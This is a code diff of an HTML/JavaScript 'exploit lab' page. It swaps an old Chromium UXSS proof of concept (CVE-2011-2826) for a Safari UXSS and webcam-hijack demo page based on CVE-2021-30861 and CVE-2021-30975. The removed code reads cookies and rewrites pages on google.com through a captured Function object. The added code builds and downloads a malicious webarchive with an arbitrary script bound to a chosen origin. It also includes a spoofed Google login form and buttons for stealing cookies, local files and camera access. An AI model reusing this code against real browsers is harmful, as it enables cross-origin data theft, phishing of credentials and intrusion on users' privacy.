@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2011-2826 | UXSS with Empty SecurityOrigin - Complete Exploit POC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🔓 Safari UXSS + Webcam Hijacking Lab | CVE-2021-30861 + CVE-2021-30975</title>
     <style>
         * {
             margin: 0;
@@ -30,12 +30,33 @@
             padding: 25px;
             background: rgba(0,0,0,0.5);
             border-radius: 20px;
-            border: 1px solid #00ff88;
+            border: 1px solid #ff6600;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,102,0,0.2), transparent);
+            animation: scan 3s infinite;
+        }
+        
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
         }
         
         .header h1 {
             font-size: 28px;
-            color: #00ff88;
+            background: linear-gradient(135deg, #ff6600, #ff0066);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         
         .header .cve {
@@ -56,9 +77,39 @@
             margin-left: 10px;
         }
         
+        .header .bounty {
+            background: #2ecc71;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .stat-card {
+            background: rgba(0,0,0,0.5);
+            padding: 10px 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff6600;
+        }
+        
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(600px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(550px, 1fr));
             gap: 25px;
         }
         
@@ -66,32 +117,41 @@
             background: rgba(30,30,50,0.95);
             border-radius: 15px;
             overflow: hidden;
-            border-left: 4px solid #00ff88;
+            border-left: 4px solid #ff6600;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            transition: transform 0.3s;
+        }
+        
+        .card:hover {
+            transform: translateY(-3px);
         }
         
         .card-header {
             padding: 15px 20px;
-            background: linear-gradient(135deg, #2c3e50, #1a1a2e);
-            color: #00ff88;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
             font-weight: bold;
             font-size: 18px;
-            border-bottom: 1px solid #00ff88;
         }
         
         .card-header.orange {
-            background: linear-gradient(135deg, #e67e22, #d35400);
-            color: white;
-        }
-        
-        .card-header.purple {
-            background: linear-gradient(135deg, #9b59b6, #8e44ad);
-            color: white;
+            background: linear-gradient(135deg, #f39c12, #e67e22);
         }
         
         .card-header.blue {
             background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
+        }
+        
+        .card-header.purple {
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+        }
+        
+        .card-header.green {
+            background: linear-gradient(135deg, #2ecc71, #27ae60);
+        }
+        
+        .card-header.red {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
         }
         
         .card-body {
@@ -128,8 +188,8 @@
             background: linear-gradient(135deg, #2ecc71, #27ae60);
         }
         
-        button.info {
-            background: linear-gradient(135deg, #3498db, #2980b9);
+        button.camera {
+            background: linear-gradient(135deg, #ff0066, #ff3300);
         }
         
         .output {
@@ -154,6 +214,7 @@
         .log-error { color: #ff4444; }
         .log-info { color: #ffaa44; }
         .log-warning { color: #ff6600; }
+        .log-camera { color: #ff0066; }
         
         .warning-box {
             background: #e74c3c20;
@@ -173,23 +234,13 @@
             font-size: 13px;
         }
         
-        iframe {
-            width: 100%;
-            height: 200px;
-            border: 1px solid #333;
-            border-radius: 8px;
-            margin-top: 15px;
-            background: white;
-        }
-        
-        pre {
-            background: #1a1a2e;
-            color: #0f0;
+        .success-box {
+            background: #2ecc7120;
+            border-left: 4px solid #2ecc71;
             padding: 15px;
-            border-radius: 8px;
-            overflow-x: auto;
-            font-size: 11px;
-            margin: 10px 0;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-size: 13px;
         }
         
         .fake-login {
@@ -210,6 +261,39 @@
             color: white;
         }
         
+        .webarchive-preview {
+            background: #1a1a2e;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 11px;
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+        
+        .camera-preview {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border-radius: 10px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+            border: 1px solid #333;
+        }
+        
+        pre {
+            background: #1a1a2e;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-size: 11px;
+            margin: 10px 0;
+        }
+        
         .status-badge {
             display: inline-block;
             padding: 4px 12px;
@@ -218,9 +302,18 @@
             margin-left: 10px;
         }
         
-        .status-vuln { background: #e74c3c; }
         .status-patched { background: #2ecc71; }
         .status-warning { background: #f39c12; }
+        .status-critical { background: #e74c3c; }
+        
+        iframe {
+            width: 100%;
+            height: 200px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            margin-top: 15px;
+            background: white;
+        }
         
         footer {
             text-align: center;
@@ -229,180 +322,251 @@
             font-size: 12px;
             opacity: 0.7;
         }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .live-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #ff0066;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse 1s infinite;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>🔓 CVE-2011-2826: UXSS with Empty SecurityOrigin</h1>
-        <p>Universal Cross-Site Scripting menggunakan Empty SecurityOrigin + about:blank Window Hijacking</p>
+        <h1>🔓 Safari UXSS + Webcam Hijacking Exploit Lab</h1>
+        <p>Based on Ryan Pickren's $100,500 Apple Bug Bounty Research (CVE-2021-30861 + CVE-2021-30975)</p>
         <div>
-            <span class="cve">CVE-2011-2826</span>
-            <span class="reward">🏆 $1,000 Chromium Security Reward</span>
+            <span class="cve">CVE-2021-30861</span>
+            <span class="cve">CVE-2021-30975</span>
+            <span class="reward">🏆 $100,500 Bounty</span>
+            <span class="bounty">🔬 UXSS + Camera Hack</span>
         </div>
-        <p style="font-size: 12px; margin-top: 15px;">Original Discovery: Sergey Glazunov | Fixed: Chrome 13+ | WebKit r91957</p>
-        <div class="status-badge status-patched">Status: Patched (2011)</div>
-        <div class="status-badge status-warning" style="margin-left: 5px;">Modern Research: Advanced Variants</div>
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">4</div>
+                <div>0day Bugs</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">$100.5k</div>
+                <div>Apple Bounty</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">UXSS</div>
+                <div>Universal XSS</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">🎥</div>
+                <div>Camera Access</div>
+            </div>
+        </div>
+        <div class="status-badge status-critical" style="margin-top: 15px;">⚠️ Patched in macOS Monterey 12.1+ | Safari 15.2+</div>
     </div>
     
     <div class="grid">
         <!-- ============================================ -->
-        <!-- MODULE 1: ORIGINAL EMPTY SECURITYORIGIN UXSS  -->
+        <!-- MODULE 1: iCloud Sharing (ShareBear) Attack   -->
         <!-- ============================================ -->
         <div class="card">
-            <div class="card-header">
-                🎯 Original Exploit: Empty SecurityOrigin
+            <div class="card-header red">
+                📱 iCloud Sharing Attack (ShareBear Design Flaw)
             </div>
             <div class="card-body">
                 <div class="warning-box">
-                    <strong>📌 Original POC (Sergey Glazunov, 2011):</strong><br>
-                    <code>w = open("http://google.com");<br>
-                    f = w.Function;<br>
-                    setTimeout(function(){alert(f("return document.documentElement.innerHTML")())}, 5000);</code>
+                    <strong>📌 Original Research:</strong> Ryan Pickren, 2021 | $100,500 Bounty<br>
+                    <strong>🎯 Vector:</strong> icloud-sharing:// scheme | ShareBear polymorphic file
                 </div>
                 
-                <button onclick="originalEmptyOriginExploit()" class="danger">🎯 Run Original CVE-2011-2826</button>
-                <button onclick="originalExploitGoogle()">🌐 Original Exploit → google.com</button>
-                <button onclick="originalExploitWithDOM()">📄 Original + DOM Access</button>
+                <button onclick="triggerShareBear()" class="danger">📱 Trigger ShareBear File Share</button>
+                <button onclick="polymorphicFileAttack()">🔄 Polymorphic File Attack Simulation</button>
+                <button onclick="generateICloudShareLink()">🔗 Generate iCloud Share Link</button>
+                
+                <div class="info-box">
+                    <strong>💡 How it works:</strong><br>
+                    1. Victim clicks "Open" on shared file (PNG image)<br>
+                    2. Attacker can later change file content/extension<br>
+                    3. File auto-updates on victim's machine without notification<br>
+                    4. Original PNG becomes malicious payload (DMG/WebArchive)
+                </div>
+                
+                <div class="webarchive-preview" id="shareBearPreview">
+                    <span class="live-indicator"></span> Waiting for ShareBear trigger...
+                </div>
                 
                 <div class="output" id="output1">
-                    <div class="log-entry log-info">[READY] Original Empty SecurityOrigin UXSS</div>
-                    <div class="log-entry log-info">[INFO] Target: Chrome &lt; 13, WebKit browsers</div>
+                    <div class="log-entry log-info">[READY] iCloud Sharing Attack Module</div>
+                    <div class="log-entry log-info">[INFO] Target: Safari 15 + macOS Monterey &lt; 12.0.1</div>
                 </div>
             </div>
         </div>
         
         <!-- ============================================ -->
-        <!-- MODULE 2: about:blank + opener Manipulation  -->
+        <!-- MODULE 2: WebArchive UXSS (CVE-2021-30861)    -->
         <!-- ============================================ -->
         <div class="card">
             <div class="card-header orange">
-                📄 about:blank + opener Manipulation (Technique #2)
+                📄 WebArchive UXSS (CVE-2021-30861)
             </div>
             <div class="card-body">
-                <div class="info-box">
-                    <strong>💡 Key Insight:</strong> Setting <code>w.opener = null</code> membuat about:blank window memiliki SecurityOrigin kosong!
+                <div class="warning-box">
+                    <strong>📌 CVE-2021-30861:</strong> Logic issue in WebKit allowing malicious webarchive to bypass Gatekeeper<br>
+                    <strong>🎯 Impact:</strong> Execute arbitrary JavaScript on any origin
                 </div>
                 
-                <button onclick="aboutBlankOpenerAttack()" class="warning">📄 about:blank + opener = null Attack</button>
-                <button onclick="aboutBlankWindowHijack()">🪟 about:blank Window Hijack</button>
-                <button onclick="detachedContextAttack()">🔗 Detached Context Attack</button>
+                <button onclick="generateWebArchive()" class="warning">📄 Generate Malicious WebArchive</button>
+                <button onclick="injectToGoogle()">🌐 Inject Script to google.com</button>
+                <button onclick="injectToZoom()">🎥 Inject to zoom.us (Camera Target)</button>
+                <button onclick="stealCookiesViaWebArchive()">🍪 Steal Cookies via WebArchive</button>
+                
+                <div class="webarchive-preview" id="webarchivePreview">
+                    WebArchive Payload Preview:
+                    <pre id="webarchiveCode" style="margin-top:10px;">&lt;script&gt;alert('[UXSS] Cross-origin script execution!');&lt;/script&gt;</pre>
+                </div>
                 
                 <div class="output" id="output2">
-                    <div class="log-entry log-info">[READY] about:blank + opener manipulation</div>
+                    <div class="log-entry log-info">[READY] WebArchive UXSS Module (CVE-2021-30861)</div>
                 </div>
             </div>
         </div>
         
         <!-- ============================================ -->
-        <!-- MODULE 3: Function Object Hijacking           -->
+        <!-- MODULE 3: Script Editor OSX Attack            -->
         <!-- ============================================ -->
         <div class="card">
             <div class="card-header purple">
-                🔧 Function Object Hijacking via Empty Origin
+                📜 Script Editor OSX Attack (CVE-2021-30975)
             </div>
             <div class="card-body">
                 <div class="warning-box">
-                    <strong>⚡ Core Technique:</strong> Menyimpan Function object dari window target sebelum navigasi
+                    <strong>📌 CVE-2021-30975:</strong> Malicious OSAX scripting addition bypasses Gatekeeper<br>
+                    <strong>🎯 Impact:</strong> Circumvent sandbox restrictions + steal local files
                 </div>
                 
-                <button onclick="functionHijackingAttack()" class="danger">🔧 Function Hijacking Attack</button>
-                <button onclick="functionConstructorHijack()">📜 Function Constructor Hijack</button>
-                <button onclick="bindFunctionHijack()">🔗 bind() Function Hijack</button>
+                <button onclick="generateOSAX()" class="danger">📜 Generate Malicious OSAX</button>
+                <button onclick="stealLocalFile()">📁 Steal /etc/passwd</button>
+                <button onclick="bypassSandbox()">🔓 Bypass Sandbox Simulation</button>
+                <button onclick="readDesktopFiles()">💻 Read Desktop Files</button>
+                
+                <div class="webarchive-preview" id="osaxPreview">
+                    <span class="live-indicator"></span> OSAX Payload Ready
+                </div>
                 
                 <div class="output" id="output3">
-                    <div class="log-entry log-info">[READY] Function object hijacking</div>
+                    <div class="log-entry log-info">[READY] Script Editor OSX Attack (CVE-2021-30975)</div>
                 </div>
             </div>
         </div>
         
         <!-- ============================================ -->
-        <!-- MODULE 4: Window Re-open Technique            -->
+        <!-- MODULE 4: Iframe Sandbox Escape               -->
         <!-- ============================================ -->
         <div class="card">
             <div class="card-header blue">
-                🪟 Window Re-open & SecurityOrigin Replacement
+                🖼️ Iframe Sandbox Escape (Bonus Bug)
             </div>
             <div class="card-body">
                 <div class="info-box">
-                    <strong>📌 Advanced Technique:</strong> open() dengan target name yang sama untuk replace SecurityOrigin
+                    <strong>💡 ShareBear Bug:</strong> ShareBear doesn't validate domain in /photos/* path<br>
+                    <strong>🎯 Impact:</strong> Escape sandboxed iframe + bypass popup blocker
                 </div>
                 
-                <button onclick="windowReopenAttack()" class="warning">🪟 Window Re-open Attack</button>
-                <button onclick="crossOriginWindowReplace()">🔄 Cross-Origin Window Replace</button>
-                <button onclick="multiStageWindowAttack()">⛓️ Multi-Stage Window Attack</button>
+                <button onclick="sandboxEscape()" class="warning">🖼️ Iframe Sandbox Escape</button>
+                <button onclick="testSandboxedIframe()">🧪 Create Sandboxed Iframe</button>
+                <button onclick="popupBypass()">🪟 Popup Blocker Bypass</button>
+                
+                <iframe id="sandboxFrame" sandbox="allow-scripts" srcdoc="
+                    <html>
+                    <body style='background:#2c2c3e;color:white;padding:20px;text-align:center'>
+                        <h3>🔒 Sandboxed Iframe</h3>
+                        <p>JavaScript is allowed, but popups and navigation are restricted</p>
+                        <button onclick='parent.testSandboxMessage()'>Test Sandbox</button>
+                        <div id='result'></div>
+                    </body>
+                    </html>
+                " style="height:150px;"></iframe>
                 
                 <div class="output" id="output4">
-                    <div class="log-entry log-info">[READY] Window re-open & origin replacement</div>
+                    <div class="log-entry log-info">[READY] Iframe Sandbox Escape Module</div>
                 </div>
             </div>
         </div>
         
         <!-- ============================================ -->
-        <!-- MODULE 5: Modern Empty Origin Exploits        -->
+        <!-- MODULE 5: Full UXSS Attack Chain              -->
         <!-- ============================================ -->
         <div class="card">
-            <div class="card-header">
-                🚀 Modern Empty Origin Exploit Variants
+            <div class="card-header green">
+                ⛓️ Full UXSS Attack Chain (Camera + Account Hijack)
             </div>
             <div class="card-body">
-                <button onclick="modernEmptyOriginAttack()" class="danger">🔥 Modern Empty Origin Attack</button>
-                <button onclick="iframeEmptyOriginAttack()">🖼️ iframe Empty Origin Attack</button>
-                <button onclick="popupEmptyOriginChain()">💀 Popup Chain Empty Origin</button>
-                <button onclick="serviceWorkerEmptyOrigin()">⚙️ ServiceWorker + Empty Origin</button>
+                <button onclick="fullAttackChain()" class="danger camera">🎥 RUN FULL CAMERA HIJACK CHAIN</button>
+                <button onclick="hijackZoomCamera()">🎥 Hijack Zoom Webcam</button>
+                <button onclick="hijackGoogleAccount()">🌐 Hijack Google Account</button>
+                <button onclick="stealAllCookies()">🍪 Steal All Browser Cookies</button>
+                <button onclick="resetAttackState()">🔄 Reset</button>
                 
-                <div class="fake-login" id="fakeLogin5" style="display:none;">
+                <div class="fake-login" id="fakeLoginPanel" style="display:none;">
                     <h4>🎭 Spoofed: https://accounts.google.com</h4>
-                    <input type="text" id="fakeEmail5" placeholder="Email">
-                    <input type="password" id="fakePass5" placeholder="Password">
-                    <button onclick="captureCreds5()">Sign In</button>
+                    <p style="font-size:11px; margin-bottom:10px;">⚠️ UXSS Attack Active - Fake login page</p>
+                    <input type="text" id="fakeEmail" placeholder="Email">
+                    <input type="password" id="fakePassword" placeholder="Password">
+                    <button onclick="captureCredentials()">Sign In</button>
+                </div>
+                
+                <div class="camera-preview" id="cameraPreview">
+                    🎥 Camera Preview (UXSS will hijack this)
                 </div>
                 
                 <div class="output" id="output5">
-                    <div class="log-entry log-info">[READY] Modern empty origin variants</div>
+                    <div class="log-entry log-info">[READY] Full UXSS Attack Chain</div>
+                    <div class="log-entry log-warning">[WARNING] Requires user interaction (one-time "Open" click)</div>
                 </div>
             </div>
         </div>
         
         <!-- ============================================ -->
-        <!-- MODULE 6: Advanced UXSS Chain                 -->
+        <!-- MODULE 6: Payload Generator                   -->
         <!-- ============================================ -->
         <div class="card">
-            <div class="card-header orange">
-                ⛓️ Advanced UXSS Chain (Combined Techniques)
+            <div class="card-header red">
+                ⚙️ Payload Generator (Custom UXSS Payloads)
             </div>
             <div class="card-body">
-                <button onclick="fullUXSSChainEmptyOrigin()" class="danger">💀 FULL UXSS ATTACK CHAIN</button>
-                <button onclick="uxssCredentialTheftChain()">👑 UXSS + Credential Theft</button>
-                <button onclick="uxssCookieStealChain()">🍪 UXSS + Cookie Stealing</button>
-                <button onclick="resetAttackState()">🔄 Reset State</button>
+                <textarea id="customPayload" rows="4" style="width:100%; background:#1a1a2e; color:#0f0; border:1px solid #ff6600; padding:10px; border-radius:8px; font-family:monospace; font-size:11px;">
+alert('[UXSS] Custom payload executed on: ' + location.href);
+document.body.style.backgroundColor = '#ff0066';
+document.body.innerHTML = '&lt;h1 style="color:white;text-align:center;padding:50px"&gt;🔥 HACKED VIA UXSS&lt;/h1&gt;';
+                </textarea>
+                
+                <button onclick="executeCustomPayload()">🚀 Execute Custom Payload</button>
+                <button onclick="generateCameraPayload()">🎥 Generate Camera Access Payload</button>
+                <button onclick="generateAccountStealer()">👑 Generate Account Stealer</button>
+                <button onclick="generateFileStealer()">📁 Generate Local File Stealer</button>
+                
+                <div class="webarchive-preview" id="payloadPreview">
+                    Payload will appear here
+                </div>
                 
                 <div class="output" id="output6">
-                    <div class="log-entry log-info">[READY] Advanced UXSS attack chain</div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- ============================================ -->
-        <!-- MODULE 7: Target Preview                      -->
-        <!-- ============================================ -->
-        <div class="card">
-            <div class="card-header blue">
-                📺 Target Window Preview
-            </div>
-            <div class="card-body">
-                <p>Target window untuk melihat hasil eksploitasi</p>
-                <iframe id="targetPreview" src="about:blank"></iframe>
-                <div id="previewStatus" class="info-box" style="margin-top:10px; font-size:11px;">
-                    Status: Menunggu aksi...
+                    <div class="log-entry log-info">[READY] Custom Payload Generator</div>
                 </div>
             </div>
         </div>
     </div>
     
     <footer>
-        <p>⚠️ Berdasarkan Chromium Issue #40092672 (CVE-2011-2826) | $1,000 Reward | Sergey Glazunov</p>
-        <p>🔬 Teknik: Empty SecurityOrigin | about:blank opener manipulation | Function object hijacking | Window re-open</p>
+        <p>⚠️ Berdasarkan Ryan Pickren's Research: "Hacking the Apple Webcam (again)" | $100,500 Apple Bug Bounty</p>
+        <p>🔬 Teknik: iCloud Sharing (ShareBear) | WebArchive UXSS (CVE-2021-30861) | Script Editor OSX (CVE-2021-30975)</p>
+        <p>📌 Target: Safari 15, macOS Monterey &lt; 12.1, macOS Big Sur &lt; 11.6.2</p>
+        <p>💡 Fixed: macOS Monterey 12.1, Safari 15.2, Security Update 2021-008 Catalina</p>
     </footer>
 </div>
 
@@ -411,8 +575,8 @@
     // Global Variables
     // ============================================
     let targetWindow = null;
-    let hijackedFunction = null;
-    let emptyOriginWindow = null;
+    let polymorphicFileState = 'png';
+    let attackActive = false;
     
     function log(outputId, message, type = 'info') {
         const outputDiv = document.getElementById(outputId);
@@ -426,684 +590,590 @@
         console.log(`[${outputId}] ${message}`);
     }
     
-    function updatePreview(message) {
-        const status = document.getElementById('previewStatus');
-        if (status) status.innerHTML = `📡 ${message}`;
-    }
-    
     // ============================================
-    // MODULE 1: ORIGINAL EMPTY SECURITYORIGIN EXPLOIT
+    // MODULE 1: iCloud Sharing Attack
     // ============================================
-    function originalEmptyOriginExploit() {
-        log('output1', '🚀 Running original CVE-2011-2826 exploit...', 'success');
-        log('output1', 'Opening google.com and capturing Function object...', 'info');
+    function triggerShareBear() {
+        log('output1', '📱 Triggering ShareBear via icloud-sharing:// scheme...', 'success');
         
+        // Generate iCloud share link simulation
+        const fakeFileId = '01fooriERbarZSTfikqmwQAem';
+        const icloudShareUrl = `icloud-sharing://www.icloud.com/iclouddrive/${fakeFileId}`;
+        
+        log('output1', `🔗 iCloud Share URL: ${icloudShareUrl}`, 'info');
+        log('output1', '⚠️ This would open ShareBear application', 'warning');
+        
+        document.getElementById('shareBearPreview').innerHTML = `
+            <span class="live-indicator"></span>
+            <strong>📱 ShareBear Payload:</strong><br>
+            File ID: ${fakeFileId}<br>
+            Initial File: puppy.png (harmless)<br>
+            <span style="color:#ff6600">After victim clicks "Open": File becomes evil.dmg/webarchive</span>
+        `;
+        
+        // Simulate polymorphic change
+        setTimeout(() => {
+            if (polymorphicFileState === 'png') {
+                log('output1', '🔄 Polymorphic file mutation: puppy.png → evil.webarchive', 'warning');
+                polymorphicFileState = 'webarchive';
+                document.getElementById('shareBearPreview').innerHTML += '<br><span style="color:#00ff88">✅ File mutated to evil.webarchive - auto-synced to victim!</span>';
+            }
+        }, 3000);
+        
+        // Try to open (will only work on actual macOS with iCloud)
         try {
-            // Original technique from Sergey Glazunov
-            const w = window.open("https://www.google.com", "_blank");
-            
-            if (!w) {
-                log('output1', '❌ Popup blocked! Please allow popups', 'error');
-                return;
-            }
-            
-            // Store Function object from the target window
-            const f = w.Function;
-            
-            log('output1', '✅ Function object captured from google.com window', 'success');
-            
-            setTimeout(() => {
-                try {
-                    // Execute function in target window context
-                    const result = f("return document.documentElement.innerHTML.substring(0, 200)")();
-                    log('output1', `🎯 Got HTML from google.com: ${result.substring(0, 100)}...`, 'success');
-                    alert(`[UXSS] Successfully accessed google.com DOM!\n\nPreview: ${result.substring(0, 200)}`);
-                } catch(e) {
-                    log('output1', `❌ Execution failed: ${e.message}`, 'error');
-                    log('output1', 'Browser likely patched (Chrome 13+ fixes this)', 'error');
-                }
-            }, 3000);
-            
-            targetWindow = w;
-            updatePreview("Target window opened: google.com");
-            
+            // window.location.href = icloudShareUrl;
+            log('output1', '💡 In real attack, this would open ShareBear', 'info');
         } catch(e) {
-            log('output1', `❌ Error: ${e.message}`, 'error');
+            log('output1', `❌ Cannot open icloud-sharing:// scheme in this browser`, 'error');
         }
     }
     
-    function originalExploitGoogle() {
-        log('output1', '🌐 Running exploit targeting google.com with DOM access...', 'info');
+    function polymorphicFileAttack() {
+        log('output1', '🔄 Demonstrating polymorphic file attack...', 'warning');
+        log('output1', 'Step 1: Victim agrees to open "vacation.png"', 'info');
+        log('output1', 'Step 2: Attacker changes file content to evil.dmg', 'warning');
+        log('output1', 'Step 3: ShareBear auto-updates file on victim machine', 'success');
+        log('output1', 'Step 4: Original harmless file becomes malicious payload!', 'success');
         
-        const w = window.open("https://www.google.com", "google_target");
-        
-        if (!w) {
-            log('output1', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        const f = w.Function;
-        
-        setTimeout(() => {
-            try {
-                // Try to get cookies
-                const cookies = f("return document.cookie")();
-                log('output1', `🍪 Cookies from google.com: ${cookies || '(none)'}`, 'success');
-                
-                // Try to modify page
-                f("document.body.style.backgroundColor = 'red'; document.body.innerHTML = '<h1 style=color:white>HACKED VIA UXSS</h1>'")();
-                log('output1', '✅ Page modified successfully!', 'success');
-                
-                alert(`[UXSS] Successfully accessed and modified google.com!\nCookies: ${cookies || 'none'}`);
-            } catch(e) {
-                log('output1', `❌ Failed: ${e.message}`, 'error');
-            }
-        }, 3000);
+        alert('[POC] Polymorphic File Attack Simulation\n\n' +
+              '1. Victim clicks "Open" on shared PNG\n' +
+              '2. Attacker changes file content/extension\n' +
+              '3. File auto-updates on victim machine\n' +
+              '4. Original PNG becomes malicious DMG/WebArchive!\n\n' +
+              'This is the core design flaw Apple fixed in macOS 12.0.1');
     }
     
-    function originalExploitWithDOM() {
-        log('output1', '📄 Original exploit with full DOM access...', 'info');
-        
-        const w = window.open("https://example.com", "example_target");
-        
-        if (!w) {
-            log('output1', '❌ Popup blocked!', 'error');
-            return;
+    function generateICloudShareLink() {
+        const fileId = prompt('Enter iCloud File ID:', '01fooriERbarZSTfikqmwQAem');
+        if (fileId) {
+            const shareLink = `icloud-sharing://www.icloud.com/iclouddrive/${fileId}`;
+            const webLink = `https://www.icloud.com/iclouddrive/${fileId}`;
+            log('output1', `🔗 iCloud Share Link: ${shareLink}`, 'success');
+            log('output1', `🌐 Web Link: ${webLink}`, 'info');
+            navigator.clipboard.writeText(shareLink);
+            log('output1', '📋 Copied to clipboard!', 'success');
         }
-        
-        const f = w.Function;
-        
-        setTimeout(() => {
-            try {
-                const title = f("return document.title")();
-                log('output1', `📄 Document title: ${title}`, 'success');
-                
-                const url = f("return location.href")();
-                log('output1', `🌐 URL: ${url}`, 'success');
-                
-                f(`
-                    const div = document.createElement('div');
-                    div.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:10px;z-index:9999">[UXSS] HACKED - Cross-origin script execution!</div>';
-                    document.body.appendChild(div);
-                `)();
-                log('output1', '✅ DOM injection successful!', 'success');
-            } catch(e) {
-                log('output1', `❌ Failed: ${e.message}`, 'error');
-            }
-        }, 3000);
     }
     
     // ============================================
-    // MODULE 2: about:blank + opener Manipulation
+    // MODULE 2: WebArchive UXSS (CVE-2021-30861)
     // ============================================
-    function aboutBlankOpenerAttack() {
-        log('output2', '📄 Running about:blank + opener manipulation attack...', 'success');
-        log('output2', 'Technique: Setting opener = null creates empty SecurityOrigin', 'info');
+    function generateWebArchive() {
+        log('output2', '📄 Generating malicious WebArchive file...', 'success');
         
-        // Step 1: Open about:blank window
-        const w = window.open("about:blank", "blank_target");
+        const targetOrigin = prompt('Target origin for UXSS:', 'https://www.google.com');
+        const payload = document.getElementById('customPayload').value || "alert('[UXSS] Cross-origin script execution!')";
         
-        if (!w) {
-            log('output2', '❌ Popup blocked!', 'error');
-            return;
-        }
+        // WebArchive format with custom origin
+        const webarchive = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>WebMainResource</key>
+    <dict>
+        <key>WebResourceData</key>
+        <data>
+        ${btoa(`<!DOCTYPE html>
+        <html>
+        <head><title>UXSS Payload</title></head>
+        <body>
+            <script>${payload}<\/script>
+            <h1>🔥 UXSS Attack</h1>
+            <p>Running on: ${targetOrigin}</p>
+        </body>
+        </html>`)}
+        </data>
+        <key>WebResourceURL</key>
+        <string>${targetOrigin}</string>
+        <key>WebResourceMIMEType</key>
+        <string>text/html</string>
+        <key>WebResourceTextEncodingName</key>
+        <string>UTF-8</string>
+    </dict>
+</dict>
+</plist>`;
         
-        log('output2', '✅ about:blank window opened', 'success');
+        document.getElementById('webarchiveCode').innerHTML = escapeHtml(webarchive.substring(0, 500)) + '...';
+        log('output2', '✅ WebArchive payload generated', 'success');
+        log('output2', `🎯 Target origin: ${targetOrigin}`, 'info');
         
-        // Step 2: Store Function object
-        const f = w.Function;
+        // Create download
+        const blob = new Blob([webarchive], {type: 'application/x-webarchive'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'evil.webarchive';
+        a.click();
+        URL.revokeObjectURL(url);
         
-        // Step 3: Set opener to null to detach
-        w.opener = null;
-        log('output2', '🔗 opener set to null - window now has empty SecurityOrigin', 'warning');
-        
-        // Step 4: Navigate to target
-        setTimeout(() => {
-            w.location = "https://www.google.com";
-            log('output2', '🌐 Navigated to google.com', 'info');
-            
-            setTimeout(() => {
-                try {
-                    const result = f("return document.documentElement.innerHTML.substring(0, 200)")();
-                    log('output2', `🎯 SUCCESS! Accessed google.com: ${result.substring(0, 100)}...`, 'success');
-                    alert(`[UXSS] Success with opener=null technique!\n\nContent: ${result.substring(0, 200)}`);
-                } catch(e) {
-                    log('output2', `❌ Failed: ${e.message}`, 'error');
-                }
-            }, 3000);
-        }, 1000);
+        log('output2', '📥 evil.webarchive downloaded - In real attack, deliver via ShareBear', 'warning');
     }
     
-    function aboutBlankWindowHijack() {
-        log('output2', '🪟 about:blank window hijack attack...', 'warning');
-        
-        // Create named about:blank window
-        const name = "HIJACK_TARGET_" + Date.now();
-        const w = window.open("about:blank", name);
-        
-        if (!w) {
-            log('output2', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        log('output2', `✅ Created about:blank window with name: ${name}`, 'success');
-        
-        // Store function
-        const f = w.Function;
-        
-        // Hijack via open() with same name
-        setTimeout(() => {
-            const hijacked = window.open("https://www.google.com", name);
-            log('output2', '🔄 Re-opened window with same name - now points to google.com', 'info');
-            
-            setTimeout(() => {
-                try {
-                    const title = f("return document.title")();
-                    log('output2', `✅ Hijacked window title: ${title}`, 'success');
-                } catch(e) {
-                    log('output2', `❌ Hijack failed: ${e.message}`, 'error');
-                }
-            }, 2000);
-        }, 1000);
-    }
-    
-    function detachedContextAttack() {
-        log('output2', '🔗 Detached context attack (from CVE-2011-2826 comment #19)...', 'info');
-        
-        const w = window.open();
-        const w2 = window.open();
-        w.close();
-        
-        const f = w2.eval("(function(){return window.alert})");
-        w2.eval('location="about:blank"');
-        
-        log('output2', '✅ Detached context created', 'success');
-        
-        setTimeout(() => {
-            try {
